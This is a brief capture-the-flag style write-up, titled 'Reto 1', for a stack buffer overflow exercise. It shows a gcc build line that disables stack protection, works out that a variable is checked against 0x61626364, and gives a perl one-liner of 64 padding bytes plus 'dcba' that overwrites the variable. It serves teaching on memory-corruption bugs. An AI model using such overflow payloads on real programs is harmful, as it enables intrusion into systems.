## Reto 1

### Compilation:

      gcc reto1.c -o reto1 -fno-stack-protector -m32

### Solution:

Now we have an if, its checks that the value is 0x61626364, now let's go from hexadecimal to ascii code,


      Hex -> ASCII
      61 -> a
      62 -> b
      63 -> c
      64 -> d

Ussing little endian, now we have the solution:

      ./reto1 $(perl -e 'print "a"x64 . "dcba"')
